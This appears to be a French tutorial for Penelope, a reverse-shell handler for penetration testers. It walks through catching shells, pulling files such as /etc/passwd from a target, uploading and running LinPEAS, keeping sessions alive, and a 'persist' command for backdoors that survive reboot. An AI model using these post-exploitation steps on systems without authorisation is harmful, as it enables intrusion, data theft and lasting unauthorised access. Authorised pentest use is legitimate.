# Penelope

### Tutoriel Complet sur Penelope

#### Introduction

**Penelope** est un outil de gestion de shells, conçu pour aider les pentesters à améliorer la gestion des shells inversés. Il fournit une interface avancée qui permet des fonctionnalités telles que l'auto-upgrade de shells en PTY (Pseudo-Terminal), la gestion de multiples sessions, le téléchargement et l'upload de fichiers, ainsi que d'autres commandes interactives.

***

#### Installation de Penelope

Penelope est un outil basé sur **Python**, donc l'installation est simple et nécessite peu de dépendances.

**Prérequis**

* **Python 3.6 ou plus récent**
* **Git** pour cloner le dépôt
* Environnement compatible **Linux** ou **macOS** (Penelope supporte principalement les shells Unix)

**Étapes d'installation**

1.  **Cloner le dépôt GitHub** : La première étape est de cloner le dépôt Penelope depuis GitHub.

    ```bash
    git clone https://github.com/brightio/penelope.git
    cd penelope
    ```
2.  **Exécuter Penelope** : Une fois le dépôt cloné, vous pouvez directement exécuter Penelope sans avoir besoin d'une installation supplémentaire.

    ```bash
    python3 penelope.py
    ```

_Note_: Il n'est pas nécessaire d'installer d'autres dépendances, Penelope est un script Python autonome.

#### Utilisation de Penelope

Penelope est conçu pour simplifier et améliorer la gestion des sessions **reverse shell** dans des environnements de pentest. Il offre plusieurs fonctionnalités pour l'amélioration de l'expérience utilisateur et la gestion efficace des sessions.

**1. Lancer Penelope pour écouter des connexions shell**

Penelope peut être utilisé pour écouter des connexions inversées (reverse shells). Par défaut, Penelope écoute sur **0.0.0.0:4444**, mais vous pouvez spécifier un autre port ou interface réseau.

```bash
# Écoute sur le port par défaut (4444)
python3 penelope.py

# Écoute sur le port 5555
python3 penelope.py 5555

# Écoute sur une interface réseau spécifique (par exemple, eth0)
python3 penelope.py 5555 -i eth0
```

**Explication** :

* Le premier argument définit le port d'écoute.
* L'option `-i` permet de spécifier une interface réseau particulière si nécessaire.

**2. Connexion à un shell bind**

Penelope peut également se connecter à des **bind shells** (un shell où la cible écoute sur un port). Utilisez la commande suivante pour établir une connexion à un shell bind sur la machine cible :

```bash
python3 penelope.py -c <target_ip> 3333
```

**Explication** :

* L'option `-c` (connect) permet de se connecter à une cible qui écoute sur le port 3333.

**3. Fonctions de téléchargement et d'upload**

Penelope inclut des commandes pour **télécharger** et **uploader** des fichiers depuis ou vers la machine cible.

```bash
# Télécharger un fichier de la cible
download /etc/passwd

# Uploader un fichier vers la cible
upload linpeas.sh /tmp
```

**Explication** :

* **download** : Télécharge un fichier spécifié depuis la machine cible.
* **upload** : Envoie un fichier local vers la cible, dans le chemin spécifié (par exemple `/tmp`).

**4. Maintien de sessions multiples**

Une des fonctionnalités puissantes de Penelope est la gestion de **multiples sessions**. Penelope permet de maintenir un certain nombre de shells actifs sur une cible, et si une session est perdue, elle sera automatiquement recréée.

```bash
python3 penelope.py --maintain 2
```

**Explication** :

* **--maintain** : Cette option permet de maintenir deux sessions actives avec la cible. Si l'une des sessions tombe, elle est automatiquement recréée.

**5. Auto-upgrade en shell PTY**

Penelope tente automatiquement d'upgrader un shell simple en **PTY** (Pseudo-Terminal), afin de permettre l'utilisation de commandes interactives (comme `nano`, `top`, etc.) et d'améliorer l'expérience shell.

Cela se fait automatiquement lorsqu'une connexion est établie. Toutefois, si le shell n'est pas automatiquement amélioré, vous pouvez forcer un upgrade manuel avec la commande suivante :

```bash
upgrade
```

**Explication** :

* **upgrade** : Tente de convertir le shell actuel en un shell interactif avec PTY, permettant des commandes interactives comme dans un terminal normal.

**6. Fonctionnalités de persistance**

Penelope peut ajouter de la **persistance** à votre connexion, en maintenant un certain nombre de sessions ou en ajoutant des backdoors. Pour configurer la persistance, utilisez la commande suivante :

```bash
persist
```

**Explication** :

* Cette commande tente de maintenir l'accès à la machine compromise même après un redémarrage ou d'autres interruptions.

**7. Serveur HTTP intégré**

Penelope dispose également d'un **serveur HTTP** intégré pour partager des fichiers facilement entre votre machine et la cible. Cela permet de servir des fichiers que la cible peut télécharger.

```bash
python3 penelope.py -s --port 8000
```

**Explication** :

* **-s** active le serveur HTTP, et l'option `--port` permet de spécifier un port particulier (8000 dans cet exemple).

**8. Exécution de scripts locaux sur la cible**

Penelope vous permet d'exécuter des scripts locaux sur la machine cible et d'obtenir les résultats sur votre machine. Cette fonctionnalité est utile pour automatiser des tâches ou effectuer des vérifications post-exploitation.

```bash
run script.sh
```

***

#### Scénarios d'utilisation

**Exemple 1 : Maintenir un accès constant à une machine**

Si vous souhaitez maintenir deux sessions actives avec une machine cible pour ne pas perdre l'accès, vous pouvez exécuter :

```bash
python3 penelope.py --maintain 2
```

Penelope régénérera une nouvelle session si une des connexions est perdue, vous garantissant ainsi un accès constant à la cible.

**Exemple 2 : Exécuter des scripts de post-exploitation**

Après avoir établi une connexion shell, vous pouvez facilement uploader et exécuter des scripts de post-exploitation, comme LinPEAS pour énumérer les informations sur la cible.

```bash
upload linpeas.sh /tmp
run /tmp/linpeas.sh
```

***

#### Conclusion

**Penelope** est un outil puissant pour les pentesters cherchant à améliorer leur gestion des shells. Grâce à ses fonctionnalités telles que le maintien de sessions multiples, l'auto-upgrade des shells en PTY, et la gestion des uploads/téléchargements, il simplifie grandement les tâches de post-exploitation.
